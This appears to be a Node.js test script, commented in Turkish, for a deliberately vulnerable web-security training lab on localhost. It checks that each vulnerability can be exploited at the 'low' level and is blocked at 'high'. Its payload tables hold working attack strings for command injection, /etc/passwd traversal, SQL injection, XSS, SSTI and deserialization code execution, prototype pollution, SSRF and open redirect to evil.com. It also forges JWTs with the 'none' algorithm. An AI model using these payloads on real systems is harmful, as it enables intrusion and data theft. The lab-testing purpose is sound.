/* UI sözleşme testi: app/labData.js'teki GERÇEK vuln spec'lerini alır ve
   app/Demos.jsx'teki doFetch + evalWin mantığını birebir tekrarlayarak canlı
   uygulamaya (http://localhost:3000) atar. Böylece UI'nin kullandığı istek
   biçimi ve "başarı" tespiti gerçek backend'e karşı doğrulanır.
   Çalıştır:  node test/ui_check.cjs                                            */
const fs = require("fs");
const path = require("path");
const http = require("http");
const jwt = require("jsonwebtoken");

// Gerçek eşzamanlılık için her istekte yeni soket (fetch keep-alive'ı seri yapar)
function rawPost(p, body, level) {
  return new Promise((resolve) => {
    const data = Buffer.from(body);
    const r = http.request({ host: "localhost", port: 3000, path: p, method: "POST", agent: false,
      headers: { "content-type": "application/json", "x-security-level": level, "content-length": data.length } },
      (resp) => { let t = ""; resp.on("data", (c) => (t += c)); resp.on("end", () => resolve(t)); });
    r.on("error", () => resolve("")); r.write(data); r.end();
  });
}

// labData.js (ESM) -> geçici CJS
const src = fs.readFileSync(path.join(__dirname, "..", "app", "labData.js"), "utf8")
  .replace("export { GROUPS, VULNS, KILLCHAINS };", "module.exports = { GROUPS, VULNS, KILLCHAINS };");
const tmp = path.join(__dirname, "_labdata.cjs");
fs.writeFileSync(tmp, src);
const { VULNS } = require(tmp);

const B = process.env.LAB_URL || "http://localhost:3000";

function evalWin(win, { text, status, timeMs }) {
  if (!win || win.manual) return false;
  if (win.flag && /FLAG\{/.test(text)) return true;
  if (win.contains && win.contains.some((c) => text.includes(c))) return true;
  if (win.regex && new RegExp(win.regex).test(text)) return true;
  if (win.status && status === win.status) return true;
  if (win.timeGtMs && timeMs > win.timeGtMs) return true;
  return false;
}
async function doFetch(req, level, opts = {}) {
  const { mainValue = "", fields = {}, headerValue = "", bodyOverride, extraHeaders } = opts;
  let p = req.path;
  const headers = { "x-security-level": level, ...(req.headers || {}), ...(extraHeaders || {}) };
  let body;
  if (req.where === "path") p = p.replace(":id", encodeURIComponent(mainValue));
  else if (req.where === "query") p += "?" + req.name + "=" + encodeURIComponent(mainValue);
  else if (req.where === "header") { headers[req.headerName] = headerValue || mainValue; if (req.body) { headers["content-type"] = "application/json"; body = req.body; } }
  else if (req.where === "rawbody") { headers["content-type"] = "application/json"; body = mainValue; }
  else if (req.where === "json") { headers["content-type"] = "application/json"; body = JSON.stringify({ [req.name]: mainValue }); }
  else if (req.where === "fields") { headers["content-type"] = "application/json"; const o = {}; for (const f of req.fields) o[f.name] = f.coerce ? Number(fields[f.name]) : fields[f.name]; body = JSON.stringify(o); }
  if (bodyOverride != null) { headers["content-type"] = "application/json"; body = bodyOverride; }
  const t0 = Date.now();
  const res = await fetch(B + p, { method: req.method, headers, body });
  const text = await res.text();
  return { status: res.status, text, timeMs: Date.now() - t0 };
}

// her vuln için: low'da sömürü payload'ı (genelde payloads[0]) + high'da güvenli beklenir
const LOWPAY = {
  "command-injection": "127.0.0.1; id",
  "file-inclusion": "/etc/passwd",
  "sql-injection": "0 UNION SELECT id,username,password,role FROM User",
  "blind-sqli": "admin' AND '1'='1",
  "xss-reflected": "<script>alert(1)</script>",
  "info-disclosure-2fa": "admin",
  "ssrf": "http://internal-admin-panel:3000/flag",
  "prototype-pollution": '{"__proto__":{"isAdmin":true}}',
  "server-side-pp-gadget": '{"__proto__":{"NODE_OPTIONS":"--require /tmp/x.js"}}',
  "ssti": "<%= global.process.mainModule.require('child_process').execSync('id') %>",
  "insecure-deserialization": "{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()\"}",
  "open-redirect": "https://evil.com",
  "host-header-poisoning": "evil.com",
  "redos": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
  "idor-bola": "1",
};
const MEDPAY = {
  "command-injection": "127.0.0.1 | id",
  "file-inclusion": "....//....//....//....//etc/passwd",
  "sql-injection": "0 UNION SeLeCt id,username,password,role FROM User",
  "blind-sqli": "admin' AND '1'='1",
  "xss-reflected": "<img src=x onerror=alert(1)>",
  "info-disclosure-2fa": "admin",
  "ssrf": "http://internal-admin-panel:3000/flag",
  "prototype-pollution": '{"constructor":{"prototype":{"isAdmin":true}}}',
  "server-side-pp-gadget": '{"constructor":{"prototype":{"NODE_OPTIONS":"--require /tmp/x.js"}}}',
  "ssti": "<%= 7*7 %>",
  "open-redirect": "//evil.com",
  "host-header-poisoning": "evil.com",
  "redos": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
  "idor-bola": "1",
};

async function sendGeneric(v, level, payload) {
  const req = v.req;
  if (req.where === "fields") {
    const fields = {}; req.fields.forEach((f) => (fields[f.name] = f.default));
    if (req.resetBefore) await doFetch(req, level, { bodyOverride: JSON.stringify({ id: 2, reset: true }) });
    return doFetch(req, level, { fields });
  }
  return doFetch(req, level, { mainValue: payload, headerValue: payload });
}

async function main() {
  let pass = 0, fail = 0;
  const ok = (b) => (b ? "✓" : "✗");
  for (const v of VULNS) {
    if (["cors-misconfig"].includes(v.slug)) { console.log(`~  ${v.slug.padEnd(24)} (manuel/CLI — curl ile)`); continue; }

    if (v.slug === "brute-force") {
      const req = v.req;
      await doFetch(req, "low", { bodyOverride: JSON.stringify({ reset: true }) });
      const r = await doFetch(req, "low", { fields: { username: "admin", password: "password" } });
      const w = /"ok"\s*:\s*true/.test(r.text); console.log(`${ok(w)}  ${v.slug.padEnd(24)} low login`); w ? pass++ : fail++;
      continue;
    }
    if (v.slug === "insecure-jwt") {
      const none = jwt.sign({ sub: 1, role: "admin" }, null, { algorithm: "none" });
      const weak = jwt.sign({ sub: 1, role: "admin" }, "secret123");
      const lo = await doFetch(v.req, "low", { mainValue: none });
      const hi = await doFetch(v.req, "high", { mainValue: weak });
      const w = evalWin(v.win, lo) && !evalWin(v.win, hi);
      console.log(`${ok(w)}  ${v.slug.padEnd(24)} low(none)=${evalWin(v.win, lo)} high(weak)=${evalWin(v.win, hi)}`); w ? pass++ : fail++;
      continue;
    }
    if (v.slug === "race-condition") {
      await rawPost("/api/coupon", '{"code":"WELCOME50","reset":true}', "low");
      const lo = await Promise.all(Array.from({ length: 10 }, () => rawPost("/api/coupon", v.req.body, "low")));
      const loN = lo.filter((t) => /"applied"\s*:\s*true/.test(t)).length;
      await rawPost("/api/coupon", '{"code":"WELCOME50","reset":true}', "high");
      const hi = await Promise.all(Array.from({ length: 10 }, () => rawPost("/api/coupon", v.req.body, "high")));
      const hiN = hi.filter((t) => /"applied"\s*:\s*true/.test(t)).length;
      const w = loN > 1 && hiN === 1;
      console.log(`${ok(w)}  ${v.slug.padEnd(24)} low=${loN}/10 applied, high=${hiN}/10`); w ? pass++ : fail++;
      continue;
    }
    if (v.slug === "host-header-poisoning") {
      // low: Host başlığı tarayıcıdan setlenemez (curl gerekir). UI-sömürülebilir seviye: medium (x-forwarded-host)
      const me = await doFetch(v.req, "medium", { mainValue: "evil.com", headerValue: "evil.com" });
      const hi = await doFetch(v.req, "high", { mainValue: "evil.com", headerValue: "evil.com" });
      const w = evalWin(v.win, me) && !evalWin(v.win, hi);
      console.log(`${ok(w)}  ${v.slug.padEnd(24)} medium(xfh)=${ok(evalWin(v.win, me))} high-safe=${ok(!evalWin(v.win, hi))} (low=Host→curl)`); w ? pass++ : fail++;
      continue;
    }
    if (["otp-bruteforce", "insecure-randomness"].includes(v.slug)) {
      // çok adımlı; sadece düşük seviyede sömürü sinyalini doğrula
      if (v.slug === "insecure-randomness") {
        const lo = await doFetch(v.req, "low"); const hi = await doFetch(v.req, "high");
        const loLen = (JSON.parse(lo.text).resetToken || "").length, hiLen = (JSON.parse(hi.text).resetToken || "").length;
        const w = loLen < 40 && hiLen >= 60;
        console.log(`${ok(w)}  ${v.slug.padEnd(24)} low token=${loLen}ch high=${hiLen}ch`); w ? pass++ : fail++;
      } else {
        const u = "uicheck_otp";
        await doFetch({ method: "POST", path: "/api/2fa", where: "json", name: "user" }, "high", { mainValue: u });
        let last = 200; for (let i = 0; i < 6; i++) last = (await doFetch({ method: "POST", path: "/api/2fa/verify", where: "fields", fields: [{ name: "user" }, { name: "code" }] }, "high", { fields: { user: u, code: "000000" } })).status;
        await doFetch({ method: "POST", path: "/api/2fa", where: "json", name: "user" }, "high", { mainValue: u });
        const after = (await doFetch({ method: "POST", path: "/api/2fa/verify", where: "fields", fields: [{ name: "user" }, { name: "code" }] }, "high", { fields: { user: u, code: "000000" } })).status;
        const w = last === 429 && after === 429;
        console.log(`${ok(w)}  ${v.slug.padEnd(24)} high lock persists (after-newcode=${after})`); w ? pass++ : fail++;
      }
      continue;
    }

    // genel: low sömürülür, high güvenli
    const lo = await sendGeneric(v, "low", LOWPAY[v.slug]);
    const hi = await sendGeneric(v, "high", LOWPAY[v.slug]);
    const wl = evalWin(v.win, lo), wh = evalWin(v.win, hi);
    let medOk = "-";
    if (MEDPAY[v.slug]) { const me = await sendGeneric(v, "medium", MEDPAY[v.slug]); medOk = evalWin(v.win, me) ? "exploit" : "blok"; }
    const w = wl && !wh;
    console.log(`${ok(w)}  ${v.slug.padEnd(24)} low=${ok(wl)} medium=${medOk} high-safe=${ok(!wh)}`);
    w ? pass++ : fail++;
  }
  console.log(`\nSONUÇ: ${pass} geçti, ${fail} başarısız (${VULNS.length} vuln).`);
  fs.unlinkSync(tmp);
  process.exit(fail ? 1 : 0);
}
main().catch((e) => { console.error(e); process.exit(1); });
